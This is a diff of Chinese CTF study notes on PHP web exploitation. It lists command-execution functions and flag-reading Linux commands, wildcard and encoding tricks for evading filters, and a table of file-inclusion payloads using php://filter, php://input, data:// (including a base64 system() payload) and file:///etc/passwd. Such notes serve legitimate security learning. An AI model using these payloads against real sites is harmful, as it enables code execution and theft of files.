@@ -1,16 +1,18 @@
+# 命令执行,函数
+
+
 >PHP官网:https://www.php.net/    查看各类函数
 
 //怎么访问根目录下的  rot13base.php
 
 
-访问 [rot13base](./rot13base.html)
+访问 [rot13base](./CTF/Web/PHP/rot13base.html)
 
-# 命令执行,函数
-
+## 常见命令
 PHP 核心：var_dump、include、file_get_contents、system、eval、phpinfo
 Linux 核心：cat、ls、find、id、pwd
 
-输出/打印
+1.输出/打印
 ```
 var_dump($var);       // 最常用：输出变量类型+值+长度，调试神器
 print_r($var);        // 打印数组/对象结构
@@ -19,7 +21,7 @@ var_export($var);     // 输出可执行的PHP代码
 printf($fmt, $var);   // 格式化输出（绕过过滤常用）
 ```
 
-文件读取/包含类(伪协议搭配)
+2.文件读取/包含类(伪协议搭配)
 ```
 include $_GET['file'];// 文件包含漏洞本体
 require $_GET['file'];
@@ -31,7 +33,7 @@ readfile($f);         // 直接输出文件内容（无回显绕过神器）
 fopen(); fread();     // **文件指针读写**
 ```
 
-命令执行
+3.命令执行
 ```
 system('id');         // 执行命令+直接输出结果
 exec('id');           // 执行命令，只返回最后一行
@@ -39,7 +41,7 @@ shell_exec('id');     // 反引号 `id` 等价，返回全部结果
 passthru('id');       // 执行命令+输出二进制流
 popen('id', 'r');     // 打开进程管道
 ```
-信息获取查
+4.信息获取查
 ```
 phpinfo();            // 调试pyload是否可用。看PHP配置、禁用函数、路径、版本（必用）
 ini_get('xxx');       // 获取php.ini配置
@@ -47,7 +49,7 @@ getcwd();             // 当前工作路径
 scandir('./');        // 列出目录文件
 dirname(__FILE__);    // 取文件目录
 ```
-编码解码
+5.编码解码
 ```
 base64_encode(); base64_decode();
 urldecode(); urlencode();
@@ -56,14 +58,14 @@ eval();               // *常用  执行PHP代码（一句话木马核心）
 assert();             // 断言=执行代码（绕过disable_functions常用）
 ```
 
-其他
+6.其他
 ```
 ini_set('display_errors',1); // 开启报错
 error_reporting(E_ALL);      // 显示所有错误
 md5(); sha1();        // 哈希
 isset(); empty();     // 判断变量
 ```
-Linux系统命令
+7.Linux系统命令
 ```
 whoami          // 查看当前用户 * 常用 
 ls              // 列出目录内容 * 常用 
@@ -83,7 +85,7 @@ tail flag       // 读后10行
 nl flag         // 带行号读
 od -c flag      // 二进制读
 ```
-通配符  转义
+8.通配符  转义
 ```
 *   匹配任意字符（除换行符外）
 ?   匹配单个字符 (常用于占位)
@@ -103,13 +105,6 @@ od -c flag      // 二进制读
 \  |空格|%20
 \ ?|问号|%3F
 \ | 右斜杠| %2F
-
-
-
-
-
-
-
 
 
 
@@ -193,15 +188,17 @@ PHP 伪协议（又称流包装器）是 PHP 内建的资源访问机制，以`�
 
 |协议| 核心能力 | 关键条件 / 限制 |	典型利用示例  |
 |----| ---- | ---- | ---- |
-|php://filter|读取 / 处理文件源码（Base64 编码绕过执行）|	无需开启远程配置|	?file=php://filter/read=convert.base64-encode/resource=index.php|
-|php://input|读取 POST 原始数据，配合包含执行代码|需allow_url_include=On；不支持multipart/form-data	|URL：?file=php://inputPOST：<?php system('id');?>|
-|data://	|内联数据直接执行（URL 嵌入代码）|	需allow_url_include=On（PHP≥5.2.0）|	?file=data://text/plain,<?php system('id');?>|
+|php://filter/convert.base64|读取任意文件 / 处理文件源码（Base64 编码绕过执行）|	无需开启远程配置|	?file=php://filter/read=convert.base64-encode/resource=index.php|
+|php://input|读取 POST 原始数据，配合包含 **执行代码**|需allow_url_include=On；不支持multipart/form-data	|URL：?file=php://inputPOST：<?php system('id');?>|
+|data://text/plain,	|内联数据直接执行（URL 嵌入代码）|	需allow_url_include=On（PHP≥5.2.0）|	?file=data://text/plain,<?php system('id');?>|
 |file://	|访问本地文件系统（绝对 / 相对路径）|	不受远程配置限制（双 OFF 可用）|	?file=file:///etc/passwd（Linux）/ file://C:/windows/system.ini（Windows）
 |zip:///phar://	|读取压缩包内文件（绕过后缀限制 / WAF）	压缩包为 ZIP 格式；|phar://需phar.readonly=Off|	zip:///tmp/shell.zip%23shell.php（%23为#URL 编码）|
+
 
 ### data://text/plain
 `data://text/plain,base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+`
 base64->`<?php system("tac flag.php")?>`-->`data://text/plain,<?php system("tac flag.php")?>`
+
 
 
 
